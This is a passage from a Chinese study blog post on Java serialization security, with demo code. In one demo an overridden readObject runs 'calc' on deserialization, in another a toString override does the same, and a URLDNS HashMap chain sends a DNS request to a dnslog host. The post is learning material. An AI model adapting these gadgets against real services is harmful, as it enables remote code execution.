<p>反序列化：将字节流转化成内存中的对象</p>
<p>2、为什么有序列化技术</p>
<p>序列化与反序列化的设计就是用来传输数据的。</p>
<p>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。</p>
<p>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。</p>
<p>3、几种创建的序列化和反序列化协议</p>
<p>• JAVA内置的writeObject()&#x2F;readObject()</p>
<p>• JAVA内置的XMLDecoder()&#x2F;XMLEncoder</p>
<p>• XStream</p>
<p>• SnakeYaml</p>
<p>• FastJson</p>
<p>• Jackson</p>
<h2 id="原生使用"><a href="#原生使用" class="headerlink" title="原生使用"></a>原生使用</h2><h3 id="UserDemo"><a href="#UserDemo" class="headerlink" title="UserDemo"></a>UserDemo</h3><p>待序列化内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class UserDemo implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    public String name=&quot;znskiw&quot;;</span><br><span class="line">    public String gender=&quot;man&quot;;</span><br><span class="line">    public Integer age=18;</span><br><span class="line">    </span><br><span class="line">public UserDemo(String name,String gender,Integer age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.gender=gender;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="SerializableDemo"><a href="#SerializableDemo" class="headerlink" title="SerializableDemo"></a>SerializableDemo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class SerializableDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        UserDemo u = new UserDemo(&quot;znskiw&quot;,&quot;man&quot;,18);  //创建一个对象 引用UserDemo</span><br><span class="line">        SerializableTest(u);  //调用方法进行序列化</span><br><span class="line">        //ser.txt 就是对象u 序列化的字节流数据</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void SerializableTest(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(&quot;ser.txt&quot;)); //将对象序列化为字节流并写入到文件中</span><br><span class="line">        oos.writeObject(obj); //将指定的对象obj序列化为字节流并写入到输出流中。</span><br><span class="line">//这两行看不懂，反正就是将对象obj序列化后输出到文件ser.txt</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/18.png" alt="18"></p>
<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="重写方法"><a href="#重写方法" class="headerlink" title="重写方法"></a>重写方法</h3><h4 id="UserDemo-1"><a href="#UserDemo-1" class="headerlink" title="UserDemo"></a>UserDemo</h4><p>待序列化内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class UserDemo implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    public String name=&quot;znskiw&quot;;</span><br><span class="line">    public String gender=&quot;man&quot;;</span><br><span class="line">    public Integer age=18;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public UserDemo(String name,String gender,Integer age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.gender=gender;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();     //指向正确readObject，不然数据全为空。具体意思后面调试解释</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;); //执行calc</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SerializableDemo-1"><a href="#SerializableDemo-1" class="headerlink" title="SerializableDemo"></a>SerializableDemo</h4><p>和原生使用是一样的</p>
<h4 id="UnserializableDemo"><a href="#UnserializableDemo" class="headerlink" title="UnserializableDemo"></a>UnserializableDemo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class UnserializableDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //调用下面的方法 传输ser.txt 解析还原反序列化</span><br><span class="line">        Object obj =UnserializableTest(&quot;ser.txt&quot;);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static Object UnserializableTest(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream  ois= new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object o = ois.readObject(); //读取Filename文件进行反序列化还原</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h5><p>先用ctrl点击追踪一下UnserializableDemo文件，倒二句话readObject从哪引用的，发现来自一个叫ObjectInputStream.java的文件</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/19.png" alt="19"></p>
<p>我们先把UserDemo文件倒二句<code>ois.defaultReadObject();</code>注释了，运行完序列化，在反序列化地方断点，知道运行到这个位置</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/20.png" alt="20"></p>
<p>这里引用了ObjectInputStream.java的readObject方法，按照常理来说应该会跳转到那里去，但是我们下一步时，却跳到了UserDemo里的readObject里去了</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/21.png" alt="21"></p>
<p>这就是重写方法，把原本的方法给替代了，再往下运行UserDemo里的readObject执行计算机命令，调出了计算机。</p>
<p>如果不把UserDemo文件倒二句<code>ois.defaultReadObject();</code>注释了，我们在执行<code>Object o = ois.readObject();</code>后，就会跳到原本引用readObject()的地方，即ObjectInputStream.java，然后再跳回来继续执行calc。而原本引用readObject()的地方是反序列化的地方，也就是说加上<code>ois.defaultReadObject();</code>后的结果就是即把原本内容反序列化又执行了calc，不加的话，就只执行calc。</p>
<h3 id="触发方法"><a href="#触发方法" class="headerlink" title="触发方法"></a>触发方法</h3><p>这个和php反序列化差不多</p>
<h4 id="UserDemo-2"><a href="#UserDemo-2" class="headerlink" title="UserDemo"></a>UserDemo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class UserDemo implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    public String name=&quot;znskiw&quot;;</span><br><span class="line">    public String gender=&quot;man&quot;;</span><br><span class="line">    public Integer age=18;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public UserDemo(String name,String gender,Integer age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.gender=gender;</span><br><span class="line">        this.age = age;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        System.out.println(gender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString() &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, gender=&#x27;&quot; + gender + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="SerializableDemo-2"><a href="#SerializableDemo-2" class="headerlink" title="SerializableDemo"></a>SerializableDemo</h4><p>同上</p>
<h4 id="UnserializableDemo-1"><a href="#UnserializableDemo-1" class="headerlink" title="UnserializableDemo"></a>UnserializableDemo</h4><p>同上</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在UnserializableDemo里<code>System.out.println(obj);</code>这句命令，把obj对象当作字符串进行输出，调用原始对象的toString方法</p>
<h3 id="可控其他类重写方法"><a href="#可控其他类重写方法" class="headerlink" title="可控其他类重写方法"></a>可控其他类重写方法</h3><h4 id="UrlDns"><a href="#UrlDns" class="headerlink" title="UrlDns"></a>UrlDns</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.example.seriatestdemo;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class UrLDns implements Serializable &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hash = new HashMap&lt;&gt;(); //用HashMap类创建了一个名为hash的哈希映射表。哈希映射表是一种键值对存储结构</span><br><span class="line">        URL u=new URL(&quot;http://56b5941bde.ipv6.1433.eu.org&quot;); //dnslog的网址</span><br><span class="line">        hash.put(u,1); //令映射表里u=&gt;1</span><br><span class="line"></span><br><span class="line">        SerializableTest(hash);</span><br><span class="line">        UnserializableTest(&quot;dns.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void SerializableTest(Object obj) throws IOException &#123;</span><br><span class="line">        //FileOutputStream() 输出文件</span><br><span class="line">        //将对象obj序列化后输出到文件ser.txt</span><br><span class="line">        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream(&quot;dns.txt&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnserializableTest(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        //读取Filename文件进行反序列化还原</span><br><span class="line">        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果是收到了dns请求</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>和重写方法有些类似，HashMap里也有一个自带的readObject()，这里调用的也不是原本的，而是HashMap里的。</p>
<p>这里的readObject()里调用了hash</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/22.png" alt="22"></p>
<p>hash又调用了hashCode</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/23.png" alt="23"></p>
<p>hashCode又调用了getProtocol，getProtocol调用getHostAddress，getHostAddress调用getByName，getByName里自带函数可以访问DNS请求</p>

                </section>

                
                

                

            </article>

            
            <nav class="dis_flex al_post_nav">
                <a class="al_post_nav_item dis_flex_acenter" href="/">
                    
                </a>
                <a class="al_post_nav_item dis_flex_acenter" href="/2023/08/09/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JS/">
                    
                        <span class="al_text_ellipsis al_post_nav_desc">安全开发-JS</span>
                        <svg class="al_arrow">
                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
                        </svg>
                    
                </a>
            </nav>
        </div>
    </div>


        <div class="al_index_footer dis_flex_center">
    <div class="al_index_footer_item al_index_footer_title">
        John Doe
    </div>

    
    

    <div class="al_index_footer_item al_index_footer_extra">
        Created By 
        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
         · Power By 
        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
    </div>

    <div class="al_index_footer_item al_index_footer_extra_right">
        All Right Reserved
    </div>
</div>

        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
        
        
        
        
        

    </body>
</html>